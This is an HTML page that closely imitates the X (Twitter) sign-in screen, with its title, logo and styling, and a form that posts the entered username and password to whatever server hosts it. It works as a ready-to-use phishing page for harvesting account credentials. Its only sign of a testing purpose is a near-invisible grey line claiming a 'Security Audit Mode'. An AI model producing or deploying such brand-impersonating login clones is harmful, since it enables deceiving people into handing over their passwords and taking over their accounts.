<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to X / X</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #000000;
            color: #e7e9ea;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
        }

        .login-container {
            width: 100%;
            max-width: 600px;
            background-color: #000000;
            padding: 40px 80px;
            display: flex;
            flex-direction: column;
            align-items: flex-start;
        }

        @media (max-width: 500px) {
            .login-container { padding: 20px; }
        }

        /* Scaled minimalist X Logo path matching official brand layout */
        .logo-box {
            margin-bottom: 36px;
            align-self: center;
        }

        .logo-box svg {
            width: 45px;
            height: 45px;
            fill: #ffffff;
        }

        h1 {
            font-size: 1.95rem;
            font-weight: 700;
            color: #f7f9f9;
            margin-bottom: 32px;
            letter-spacing: -0.5px;
        }

        form {
            width: 100%;
        }

        .input-wrapper {
            position: relative;
            margin-bottom: 24px;
            width: 100%;
        }

        .input-wrapper input {
            width: 100%;
            background-color: #000000;
            border: 1px solid #333639;
            border-radius: 4px;
            padding: 16px 12px;
            color: #ffffff;
            font-size: 1.05rem;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-wrapper input:focus {
            border-color: #1d9bf0;
        }

        .input-wrapper label {
            position: absolute;
            left: 12px;
            top: 16px;
            color: #71767b;
            font-size: 1rem;
            pointer-events: none;
            transition: transform 0.2s, font-size 0.2s, color 0.2s;
            transform-origin: left top;
        }

        /* Float label behavior when typing or focused */
        .input-wrapper input:focus ~ label,
        .input-wrapper input:not(:placeholder-shown) ~ label {
            transform: translateY(-10px) scale(0.75);
            color: #1d9bf0;
        }
        
        .input-wrapper input:not(:placeholder-shown) ~ label {
            color: #71767b;
        }

        .btn-next {
            width: 100%;
            background-color: #ffffff;
            color: #0f1419;
            border: none;
            border-radius: 9999px;
            padding: 12px;
            font-size: 0.95rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 12px;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: #e6e6e6;
        }

        .btn-forgot {
            width: 100%;
            background-color: transparent;
            color: #ffffff;
            border: 1px solid #536471;
            border-radius: 9999px;
            padding: 12px;
            font-size: 0.95rem;
            font-weight: 700;
            cursor: pointer;
            margin-top: 16px;
            transition: background-color 0.2s;
        }

        .btn-forgot:hover {
            background-color: rgba(255,255,255,0.03);
        }

        .footer-text {
            margin-top: 40px;
            font-size: 0.9rem;
            color: #71767b;
            width: 100%;
            line-height: 1.4;
        }

        .footer-text a {
            color: #1d9bf0;
            text-decoration: none;
        }

        .footer-text a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="login-container">
        
        <div class="logo-box">
            <svg viewBox="0 0 24 24" aria-hidden="true">
                <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
            </svg>
        </div>

        <h1>Sign in to X</h1>

        <form action="/" method="POST">
            <div class="input-wrapper">
                <input type="text" id="username" name="username" placeholder=" " required autocomplete="off">
                <label for="username">Phone, email, or username</label>
            </div>

            <div class="input-wrapper">
                <input type="password" id="password" name="password" placeholder=" " required autocomplete="off">
                <label for="password">Password</label>
            </div>

            <button type="submit" class="btn-next">Log in</button>
            <button type="button" class="btn-forgot">Forgot password?</button>
        </form>

        <div class="footer-text">
            Don't have an account? <a href="#">Sign up</a>
            <br><br>
            <span style="font-size: 0.75rem; color: #333639;">Security Audit Mode: Local evaluation instance logging network session paths.</span>
        </div>

    </div>

</body>
</html>
